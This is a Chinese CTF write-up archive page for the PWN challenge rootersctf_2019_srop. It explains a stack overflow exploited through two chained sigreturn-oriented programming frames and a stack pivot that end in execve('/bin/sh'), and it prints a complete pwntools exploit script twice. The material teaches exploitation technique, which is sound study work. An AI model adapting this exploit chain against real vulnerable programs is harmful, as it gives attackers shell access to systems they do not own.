# 知识点

Stack

# 题目分析

分类：PWN / Stack。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [debug.py](debug.py)
- [exploit.py](exploit.py)
- [rootersctf_2019_srop](rootersctf_2019_srop)

## 已有分析

- [rootersctf_2019_srop_wp.md](notes/rootersctf_2019_srop_wp.md)


### rootersctf_2019_srop Writeup — 从一条 `syscall` 到两次 SROP

> 本文只讨论公开 CTF 的本地题目样本：amd64、无 PIE、NX 开启、无 Canary。它的关键不是“背 SROP payload”，而是看懂这条因果链：**栈溢出控制 RIP → 用 `rt_sigreturn` 恢复第一组寄存器 → `read` 把第二阶段搬进固定可写页 → `leave; ret` 把栈迁到那里 → 第二次 `rt_sigreturn` 执行 `execve`。**
>
> 本题的地址和 `0x88` 偏移来自这个题目样本的反汇编。换一个 ELF、换一个编译选项，先重新推导，不能照抄。
>
> **相关笔记：** `函数调用与栈帧` · `syscall是什么` · `Linux信号与signal frame` · `SROP` · `栈迁移` · `WP索引与复盘入口` · `ciscn_2019_es_7_wp`

#### 0. 先把答案压成一句话

题目没有足够的 `pop rdi; ret`、`pop rsi; ret`、`pop rdx; ret` 来做普通 ROP，但它有一条可达的 `syscall`，也能让我们把完整伪造 frame 放在触发时的栈顶。

所以先让 `rax=15` 并执行 `syscall`，让内核把 frame 里的内容恢复成一次 `read(0, DATA, 0x400)`；接着利用 gadget 尾部真实存在的 `leave; ret`，把“下一张 ROP 栈”搬到 `DATA`。第二次重复同一招，恢复出 `execve("/bin/sh", 0, 0)` 的寄存器现场。

```text
第一次输入（真实栈）
  溢出 → rax=15 → rt_sigreturn
  → read(0, DATA, 0x400)
  → leave; ret 把栈切到 DATA

第二次输入（DATA 伪栈）
  "/bin/sh\0" + rax=15 + 第二个 frame
  → rt_sigreturn
  → execve("/bin/sh", 0, 0)
```

#### 1. 题目画像：先确认，不要先套 SROP

在题目目录运行：

```bash
file ./rootersctf_2019_srop
checksec --file=./rootersctf_2019_srop
readelf -lW ./rootersctf_2019_srop
objdump -d -M intel ./rootersctf_2019_srop
```

本题样本应导向下面这张表。这里每一项都在回答“这条利用链有没有地基”。

| 观察     | 本题事实                       | 对方案的影响                                                  |
| ------ | -------------------------- | ------------------------------------------------------- |
| 架构     | Linux amd64                | `rt_sigreturn` 的 syscall 号是 `15`；frame 必须按 amd64 ABI 生成 |
| PIE    | 无                          | 主程序内的 gadget 地址和 `0x402000` 这块映射在本地运行时固定；有 PIE 时先泄露基址   |
| Canary | 无                          | 溢出可以覆盖 saved RIP；有 Canary 时先处理泄露/绕过                     |
| NX     | 开启                         | 不能把输入当 shellcode 直接跳过去；本题复用已有 `syscall` 指令              |
| 输入     | `read(0, buf, 0x400)`      | 有足够空间放 gadget、两个地址和完整 frame                             |
| 代码资源   | 基本只有 `syscall; leave; ret` | 普通 ROP 缺参数控制，SROP 才有价值                                  |
| 可写页    | `0x402000` 所在的 RW 映射       | 用来接收第二阶段并充当伪栈；须以 `readelf` / `vmmap` 实测                 |

> [!warning] 不要把“静态链接”理解成“天然没有 libc、PLT/GOT，也必然只能 SROP”。这里是**这个极小样本**没有可用的常规调用路径和参数 gadget；真正的决策依据是实际反汇编与可用控制能力。

##### 1.1 本次对题目文件的静态核验

这里不是根据题名猜的。对本地文件 `rootersctf_2019_srop` 的实际检查得到：

| 项目 | 本次观察到的证据 | 结论 |
|---|---|---|
| ELF 头 | `ET_EXEC`、`x86-64`、entry=`0x401037` | 非 PIE 主程序；题内代码地址在该样本中固定 |
| 依赖 | `file` 显示 `statically linked, stripped`；`objdump -p` 没有 Dynamic Section | 没有动态解析出来的 libc / PLT 调用路径可直接复用 |
| 代码规模 | `.text` 为 `0x48` 字节，范围 `0x401000–0x401047` | 不是“没认真找 gadget”，而是代码本来就极少 |
| 数据 | `.data` 仅 `0x2a` 字节，`0x402000` 是题目 banner | 初始没有 `/bin/sh\0`，也没有现成的第二阶段链 |
| 装载段 | `0x402000` 的 `LOAD` 段 flags 为 `rw-`，但 `filesz=memsz=0x2a` | 它是 RW 段，不是 ELF 声明出的 `0x400` 大数组；后续空间必须以 Linux 的页级映射实测 |
| 栈 | `STACK` 标记为 `rw-` | 栈不可执行；本题不走“直接跳输入 shellcode” |

> [!warning] **`0x402000 + 0x400` 的边界不能从 section size 推出来。** Linux 加载器会按页建立映射，公开样本利用会将同一 RW 页当作更大的落点；但这是运行时映射行为。首次复现请在 Linux GDB 中对进程执行 `vmmap 0x402000`，确认 `0x402000` 起始页的实际范围与权限，再把第二阶段写进去。当前 macOS 环境无法直接执行这个 Linux ELF，所以上述“整页可写”尚未在本机运行时复测。

##### 1.2 为什么选 SROP，而不是其他套路

先列需求，再看每种方法缺了什么。最终不是“见到 syscall 就无脑 SROP”，而是它恰好是缺口最少的一条链。

| 候选方法 | 本题缺少什么 / 为什么不选 |
|---|---|
| ret2libc / ret2plt | 没有动态链接的 libc、PLT 或可调用 `system` |
| 普通 ret2syscall | 只有 `pop rax`；没有证实可用的 `pop rdi/rsi/rdx`，无法给 `execve` 准备三个参数 |
| 直接 `execve` | 初始内存中只有 banner，没有 `/bin/sh\0`；而栈地址受 ASLR 影响，不能把栈中字符串地址写死进 `rdi` |
| 直接跑 shellcode | 栈是 RW 而非 RWX，`.text`/`.data` 的权限也不允许把新输入当代码执行；题内没有常规 `mprotect` 参数链 |
| 一次 SROP | SROP 虽能设置 `rdi`，但第一次触发前仍没有一个**已知地址**指向 `/bin/sh\0`；必须先用 `read` 把它搬到固定 RW 映射 |
| **两次 SROP + 栈迁移** | 第一次一次性设置 `read` 的所有参数并把第二阶段放到已知地址；`leave; ret` 让第二次链从这块已知地址继续；第二次再设置 `execve` 参数 |

因此“为什么是两次”可以说清楚：**第一帧解决数据落点与后续控制流，第二帧才解决最终 syscall 的参数。** 这两件事在最初可控栈上不能合并，因为 `/bin/sh` 还不存在于可预测地址。

```text
输入 0x400 字节
      │
      ▼
read 写到 rbp-0x80，覆盖 saved RIP（控制流原语）
      │
      ├─ 普通 ROP？──缺 rdi/rsi/rdx 的设置路径──✘
      │
      ▼
pop rax; syscall，让 rax=15（SROP 入口）
      │
      ▼
frame1 一次恢复 read(0, DATA, 0x400)
      │                         │
      │                         └─把 /bin/sh 与 frame2 写到固定地址
      ▼
syscall; leave; ret 用 frame1.rbp 切到 DATA 伪栈
      │
      ▼
frame2 一次恢复 execve(DATA, 0, 0) ──► /bin/sh
```

#### 2. 从反汇编推漏洞，而不是从伪 C 猜偏移

核心代码很短：

```asm
0x401000: push   rbp
0x401001: mov    rbp,rsp
0x401004: sub    rsp,0x40
          ; write(1, 0x402000, 0x2a)  ; 这里读的是 .data 中的 banner
0x40101f: syscall
0x401021: mov    edi,0
0x401026: lea    rsi,[rsp-0x40]    ; read 的 buf
0x40102b: mov    edx,0x400
0x401030: push   0
0x401032: pop    rax
0x401033: syscall                  ; 此刻 rax=0，所以是 read
0x401035: leave
0x401036: ret
0x401037: call    0x401000         ; ELF entry：正常情况下调用上面的函数
0x40103c: mov     eax, 0x3c        ; 正常返回后执行 exit(0)
0x401046: syscall
```

正常执行时，`0x401037` 的 `call` 把 `0x40103c` 压入栈；函数末尾的 `ret` 会取回这个地址并退出。溢出的本质就是把这个本该为 `0x40103c` 的 saved RIP 改成 `0x401032`，让返回后不去 `exit`，而是开始我们的 SROP 链。

##### 2.1 为什么 offset 是 `0x88`

关键细节在 `lea rsi,[rsp-0x40]`。它不是“只开了 `0x40` 字节，所以 offset 就是 `0x48`”。推导如下：

```text
函数刚进入、执行 push rbp 后：
    rbp = 保存的 rbp 所在位置

执行 sub rsp, 0x40 后：
    rsp = rbp - 0x40

read 的目标：
    rsi = rsp - 0x40 = rbp - 0x80

因此，从 read 写入起点算：
    +0x80  是 saved RBP
    +0x88  是 saved RIP   ← 要覆盖的返回地址
```

```text
低地址
  buf 起点 = rbp-0x80  [我们的第 0 个输入字节]
  ...
  buf+0x80              [saved RBP]
  buf+0x88              [saved RIP]  ← 放 0x401032
  buf+0x90              [给 pop rax 的值：15]
  buf+0x98              [伪造的 SigreturnFrame 起点]
高地址
```

`read` 最多读 `0x400` 字节，所以 0x88 之后还有足够空间。这里应该用 `cyclic` 或上面的指令级推导确认；“先填 `0x80` 或更多碰碰运气”会把 payload 的每个槽位整体错开，SROP 会直接失败。

##### 2.2 我们真正拥有的 gadget

| 地址 | 指令 | 作用 | 容易误解的点 |
|---:|---|---|---|
| `0x401032` | `pop rax; syscall; leave; ret` | 从栈取一个值给 `rax`，接着马上发起 syscall | 它不是单纯的 `pop rax; ret`；`syscall` 返回后还会执行 `leave; ret` |
| `0x401033` | `syscall; leave; ret` | 按当前寄存器执行 syscall，然后进行栈迁移/返回 | `syscall` 本身不会压普通返回地址；后面的 `leave; ret` 是 gadget 自己的指令 |
| `0x401046` | `syscall` | `_start` 后的 `exit` syscall 指令 | 可作为纯 syscall 落点；本链用 `0x401033` 是为了利用其尾部迁移 |

普通 ROP 缺的是系统调用参数：amd64 Linux 要求 `rax=号，rdi/rsi/rdx=前三个参数`。本题没有可验证的 gadget 去逐一设置它们；SROP 恰好可以一次恢复这些寄存器和 `rip/rsp/rbp`。

#### 3. SROP 到底在“恢复”什么

正常信号返回时，内核要把被中断线程的现场还原。简化为：内核此前把寄存器存到用户栈上的 signal frame；trampoline 发起 `rt_sigreturn`；内核从当前 `rsp` 读 frame，并恢复寄存器后继续运行。

```text
正常信号：
内核保存现场到 frame → handler 执行 → rt_sigreturn → 恢复原现场

本题 SROP：
我们把假 frame 写进可控内存 → rax=15, syscall → 内核按假 frame 恢复现场
```

这不是调用一个“能传很多参数的函数”。执行触发用的 `syscall` 前，**真实**寄存器应满足 `rax=15`，**真实**`rsp` 应正好指向 frame 起点；执行之后，frame 中保存的值才会成为真实的 `rax/rdi/rsi/rdx/rip/rsp/rbp`。

对这题最重要的 frame 字段：

| 字段 | 第一帧（搬运第二阶段） | 第二帧（启动 shell） |
|---|---|---|
| `rax` | `0`，即 `read` | `59`，即 `execve` |
| `rdi` | `0`，stdin | `DATA`，`/bin/sh` 的地址 |
| `rsi` | `DATA` | `0` |
| `rdx` | `0x400` | `0` |
| `rip` | `0x401033`，执行 `read` 后接 `leave; ret` | 可达的 `syscall`，执行 `execve` |
| `rbp` | 第二阶段伪栈的 saved-RBP 槽地址 | 成功的 `execve` 不返回，通常不是关键 |
| `rsp` | 让恢复后的现场有效；但本链的后续栈由 `leave` 以 `rbp` 为准 | 成功的 `execve` 不返回，通常不是关键 |

> [!tip] 不需要手抄 x86-64 signal frame 的字节偏移。`SigreturnFrame()` 负责按照当前 pwntools 的 amd64 ABI 序列化；你的责任是用 GDB 验证：触发时 `$rsp` 对不对，恢复后真实寄存器对不对。frame 的固定长度或字段偏移不是跨架构口诀。

#### 4. 两阶段设计：先搬舞台，再执行 `execve`

题目起初没有 `"/bin/sh\0"` 字符串，也没有可靠的栈地址。虽然主程序无 PIE，**栈仍受 ASLR 影响**，因此不要把 `/bin/sh` 放在栈上后硬猜指针。

选择 `DATA = 0x402000` 所在 RW 页的理由是：这个题目的加载地址固定。静态检查只能证明该 `LOAD` 段的 `rw-` 权限，且其 `memsz` 实际只有 `0x2a`；利用所依赖的是 Linux 加载后页对齐的**映射页**。因此先在目标 Linux 环境用 `vmmap 0x402000` 确认实际范围，再决定 `DATA+0x200` 是否安全。不能只因 `.data` 节很短就断言不可用，也不能跳过映射检查直接把“可写 0x400”当成 ELF 字段。

##### 4.1 第一帧：请求第二次输入，同时埋下栈迁移

第一帧恢复出：

```text
read(0, DATA, 0x400)
```

恢复后 `rip=0x401033`，因此流程不是“read 后自动回 ROP”，而是：

```text
0x401033  syscall        ; read 阻塞，等第二阶段输入
           ↓ read 返回
0x401035  leave          ; rsp = rbp；然后 pop rbp
0x401036  ret            ; 从新 rsp 顶取下一个 RIP
```

所以第一帧的关键是 `rbp = DATA + 0x200`。`leave` 会无视之前恢复出的 `rsp`，直接把 `rbp` 变为新的 `rsp`。这正是“栈迁移”。

##### 4.2 第二阶段在 `DATA` 中的精确布局

下面按原脚本的 `DATA+0x200` 规划：

```text
DATA+0x000  "/bin/sh\0" + 0 填充
             ...
DATA+0x200  伪 saved RBP（任意 8 字节；这里只是 `pop rbp`，暂不解引用，故放 0）
DATA+0x208  0x401032：pop rax; syscall; leave; ret
DATA+0x210  15：给 pop rax，触发第二次 rt_sigreturn
DATA+0x218  第二个 SigreturnFrame
```

`leave` 做完后，`ret` 正好从 `DATA+0x208` 取到 `0x401032`。随后 `pop rax` 从 `DATA+0x210` 取到 `15`，此时 `rsp=DATA+0x218`，恰好指向第二个 frame。这就是每个 `+0x200`、`p64(0)`、gadget、`p64(15)` 的因果关系，不是为了对齐随便填的 padding。

##### 4.3 第二帧：只做一件事

第二帧恢复：

```text
rax = 59
rdi = DATA          ; 指向 "/bin/sh\0"
rsi = 0
rdx = 0
rip = 0x401033      ; 或其他已验证的 syscall 指令
```

即：

```text
execve("/bin/sh", NULL, NULL)
```

本题预期 `execve` 成功后进程映像被 shell 替换，因而不会执行 gadget 后面的 `leave; ret`。如果它返回了，先看 `$rax` 的负错误码，再检查路径、地址、协议或题目环境，不要继续盲调 frame 偏移。

#### 5. 利用流程总览

```text
① 初始 read 把第 1 阶段写到真实栈
    buf+0x88 = pop_rax_syscall_leave_ret
    buf+0x90 = 15
    buf+0x98 = frame1

② ret 到 0x401032
    pop rax → rax=15
    syscall → 内核从此刻 rsp 指向的 frame1 恢复寄存器

③ frame1 让程序执行 read(0, DATA, 0x400)
    第二阶段被读到已知 RW 页

④ read 返回后 gadget 执行 leave; ret
    leave: rsp=rbp=DATA+0x200
    ret:   RIP=[DATA+0x208]=0x401032

⑤ 第二个 pop rax / syscall
    rax=15，rsp 指向 frame2
    内核恢复 frame2

⑥ frame2 让程序执行 execve("/bin/sh", 0, 0)
```

#### 6. 脚本与 payload 对照

原脚本保留在这里，但把第一阶段偏移改为由反汇编推出来的 `0x88`，不再用“填多一点”的不确定写法。脚本的主要价值是把上面的内存图编码出来；不要只跑成功就结束。

```python
from pwn import *
context(os='linux', arch='amd64')

p = process('./rootersctf_2019_srop')

POP_RAX = 0x401032   # pop rax; syscall; leave; ret
SYSCALL = 0x401033   # syscall; leave; ret
DATA    = 0x402000   # 本题样本的固定 RW 页起点；换 ELF 必须验证

### 第 1 帧：read(0, DATA, 0x400)，读入第二阶段
f1 = SigreturnFrame()
f1.rax = constants.SYS_read
f1.rdi = 0
f1.rsi = DATA
f1.rdx = 0x400
f1.rip = SYSCALL
f1.rbp = DATA + 0x200             # read 返回后的 leave 用它完成栈迁移
f1.rsp = DATA + 0x200             # 取合法地址；本链随后由 leave 以 rbp 为准

### 第 1 阶段：saved RIP 的准确偏移为 0x88
p.send(b"A" * 0x88 + p64(POP_RAX) + p64(15) + bytes(f1))

### 第 2 帧：execve("/bin/sh", 0, 0)
f2 = SigreturnFrame()
f2.rax = constants.SYS_execve
f2.rdi = DATA
f2.rsi = 0
f2.rdx = 0
f2.rip = SYSCALL

### read 写入 DATA 后，leave;ret 会从 DATA+0x200 开始消费伪栈。
payload2  = b"/bin/sh\x00".ljust(0x200, b"\x00")
payload2 += p64(0) + p64(POP_RAX) + p64(15) + bytes(f2)
p.send(payload2)

p.interactive()
```

> [!warning] 这份脚本使用 `send`，不是 `sendline`，因为 `read` 按字节接收，不以换行作为协议边界。远程题若收发不同步，要先按真实 banner / 输入提示使用 `recvuntil` 或 `sendafter`；不要用 `sleep` 当作协议正确的证据。

#### 7. 必做调试：四次停在同一个 `syscall`

下面的调试不需要重写 exploit。目标只是把“我觉得应该这样”变成四条可观察事实。因为这里要在运行中发送两次输入，最顺手的方式是让已有脚本在 `p = process(...)` 后暂停，再由 `gdb.attach` 附加；不要单独 `run` 后期待 GDB 自动替你发送两个阶段。

```gdb
set disassemble-next-line on
break *0x401033
continue
```

同一个断点会经历几个不同角色。每次停住，先执行：

```gdb
info registers rax rdi rsi rdx rbp rsp rip
x/i $rip
x/8gx $rsp
```

| 第几次停在 `0x401033` | 你应该看到什么 | 它证明什么 |
|---:|---|---|
| 1 | `rax=0`、`rsi` 指向真实栈的输入 buf | 原程序正在执行最初的 `read` |
| 2 | `rax=15`，`$rsp` 的第一个字就是 frame1 的开头 | 触发 SROP 的条件满足；这里可先 `x/32gx $rsp` 记录 frame |
| 3 | 单步越过第 2 次后，会回到这里且寄存器为 `read(0, DATA, 0x400)` | 内核真的按 frame1 恢复了 `rax/rdi/rsi/rdx/rip` |
| 4 | `rax=15`，`$rsp` 指向 DATA 内的 frame2 | `leave; ret` 的栈迁移和第二次 SROP 链都对齐了 |

在第 2 次和第 4 次（也就是 `rax=15`）尤其要做一次真正的前后对照：

```gdb
### syscall 前：当前 rsp 必须就是 frame 起点
info registers rax rsp rip
x/32gx $rsp

### 只走过这条 syscall；随后观察 frame 恢复出的真实现场
si
info registers rax rdi rsi rdx rbp rsp rip
x/i $rip
```

第一帧恢复后，`$rip` 应为 `0x401033`，`$rax=0`，`$rsi=DATA`，`$rdx=0x400`。再在 `0x401035` 断下也很有帮助：

```gdb
break *0x401035
continue
info registers rax rbp rsp rip
x/12gx $rbp
x/s 0x402000
```

此处应能看到：第二阶段已经写进 `DATA`，而 `rbp` 指向 `DATA+0x200`。对 `leave` 单步两次，观察 `$rsp` 从真实栈变为 `DATA+0x200`，再由 `ret` 取出 `DATA+0x208` 的 gadget。这样你就不是“知道要 stack pivot”，而是亲眼看到了它怎样发生。

还有一个容易被忽略但在本题完全正常的现象：第一帧把 `$rsp` 设到 `DATA+0x200`，而随后的 `read` 会把第二阶段覆盖到同一页。这不会破坏返回路径，因为 `read` 之后马上执行的是 `leave`，它会把 `$rsp` 重新赋为 `$rbp`；真正会被 `ret` 消费的槽位，是第二阶段写好的 `DATA+0x208`，不是第一帧恢复的 `$rsp` 内容。

辅助检查可以使用：

```bash
strace -e trace=read,rt_sigreturn,execve ./rootersctf_2019_srop
```

`strace` 能确认系统调用顺序；它不能替代 GDB 对 frame 起点、`rip`、`rsp` 和寄存器的验证。

#### 8. 常见失败：看到现象后怎么回推

| 现象 | 优先怀疑 | 第一条验证 |
|---|---|---|
| 到 `0x401033` 时 `rax` 不是 15 | saved RIP offset、`p64(15)` 的槽位或 gadget 地址错 | `x/8gx $rsp`，回看 `ret` 后栈槽；确认本题是 `0x88` |
| `syscall 15` 后立即崩溃 | frame 不在触发时 `$rsp`、pwntools 架构错、`rip` 无效 | 触发前 `info reg rax rsp`，再 `x/32gx $rsp` |
| 第一帧看似恢复成功，但第二阶段不进 | 第一帧 `rbp` 没指向伪栈，或伪栈内 `ret` 槽位置错 | 在 `0x401035` 看 `$rbp`，再 `x/8gx $rbp` |
| `ret` 跳到 0 或垃圾地址 | 忘了 `leave` 先 `pop rbp`，把 gadget 放在 `DATA+0x200` 而非 `DATA+0x208` | 手推：`leave` 后 `$rsp=DATA+0x208`，`ret` 从那里取 RIP |
| 第二帧后没有 shell | `execve` 返回错误、`/bin/sh` 地址不对、远端协议/环境不同 | 单步后看 `$rax`；负值是 `-errno`；`x/s $rdi` 验证字符串 |
| 只改 `rsp` 却没有栈迁移 | 忽略了 gadget 后面的 `leave` | 反汇编 `0x401033`，并在 `leave` 前后看 `$rsp/$rbp` |

#### 9. 这道题真正该带走的东西

```text
看到：可控 RIP + 可达 syscall + gadget 不够设参数
想到：检查能否把 rax 设为 rt_sigreturn 号，并在触发时让 rsp 指向完整 frame。

看到：syscall 后面紧跟 leave; ret
想到：不是“自动回 ROP”，而是要用 frame.rbp 设计下一张栈。

看到：主程序无 PIE、栈地址未知
想到：把字符串、后续 frame、伪栈搬到已验证的固定 RW 映射，而不是猜栈地址。
```

本题不是“有 `syscall` 就能 SROP”。最少还要逐项满足：目标架构与 frame 匹配、能得到信号返回号、触发瞬间 `rsp` 指向可读完整 frame、恢复后的 `rip` 可执行、后续输入/栈没有互相覆盖，并且目标 syscall 未被 seccomp 拦截。

#### 10. 一个小验收，不用脚本也能答

关闭本文后，尝试自己回答并用 GDB 验证：

1. 为什么 `read` 输入起点到 saved RIP 是 `0x88`，而不是只看 `sub rsp, 0x40` 得出的 `0x48`？
2. 第一帧之后，真正决定第二阶段伪栈位置的是 `frame.rsp` 还是 `frame.rbp`？把 `syscall; leave; ret` 的三条指令顺序说出来。
3. 第二阶段里为什么 gadget 在 `DATA+0x208`，而不是 `DATA+0x200`？
4. 在第二次 `rt_sigreturn` 前，GDB 里应同时看到哪两个事实，才能证明 frame 没有错位？

能脱稿手推并在本地断点验证，才说明这篇 WP 已经变成你的理解；只把脚本跑出 shell 还不算掌握。

#### 参考资料

- [Linux `sigreturn(2)`](https://man7.org/linux/man-pages/man2/sigreturn.2.html)：确认正常信号返回中内核恢复用户上下文的机制。
- [pwntools `SigreturnFrame` 文档](https://docs.pwntools.com/en/stable/rop/srop.html)：核对当前工具如何生成目标架构的 frame。
- [题目样本反汇编与两阶段思路对照](https://hackmd.io/@Xornet/r1EcaJnxv)：用于交叉核对本题的指令、偏移和 `leave; ret` 栈迁移；以手头二进制实测为准。

#### 相关代码与实战模板

- 本页模板入口：`ret2text 本地教学靶场` · `两阶段 ret2libc 本地靶场` · `pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。


# EXP

- [debug.py](debug.py)
- [exploit.py](exploit.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
import os
context(os='linux', arch='amd64')
pwn = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rootersctf_2019_srop")
p = process(pwn)
POP_RAX = 0x401032
SYS_LV  = 0x401033
DATA    = 0x402000
# Stage 1: SROP -> read(0, DATA, 0x400)
f1 = SigreturnFrame()
f1.rax = constants.SYS_read
f1.rdi = 0; f1.rsi = DATA; f1.rdx = 0x400
f1.rip = SYS_LV; f1.rbp = DATA+0x200; f1.rsp = DATA+0x200
p.send(b"A"*0x80 + p64(0) + p64(POP_RAX) + p64(constants.SYS_rt_sigreturn) + bytes(f1))
# Stage 2: SROP -> execve("/bin/sh")
f2 = SigreturnFrame()
f2.rax = constants.SYS_execve
f2.rdi = DATA; f2.rsi = 0; f2.rdx = 0
f2.rip = SYS_LV
p.send(b"/bin/sh\x00".ljust(0x200, b"\x00") + p64(0) + p64(POP_RAX) + p64(constants.SYS_rt_sigreturn) + bytes(f2))
p.interactive()
```
